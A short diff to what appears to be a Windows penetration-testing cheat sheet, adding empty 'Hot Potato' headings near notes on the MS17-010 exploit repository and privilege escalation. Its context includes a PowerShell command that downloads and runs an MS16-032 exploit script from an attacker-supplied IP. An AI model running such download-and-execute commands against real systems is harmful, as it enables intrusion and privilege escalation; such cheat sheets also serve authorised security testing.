@@ -150,6 +150,9 @@ git clone https://github.com/worawit/MS17-010.git
   * run the ps1 exploit:
     ##### C:\windows\sysnative\windowspowershell\v1.0\powershell IEX(New-Object Net.WebClient).downloadString('http://\<ip>/ms16032.ps1')
   
+## Potatos
+### Hot Potato
+
 ## Privilege Escalation
 ### Windows
 * systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
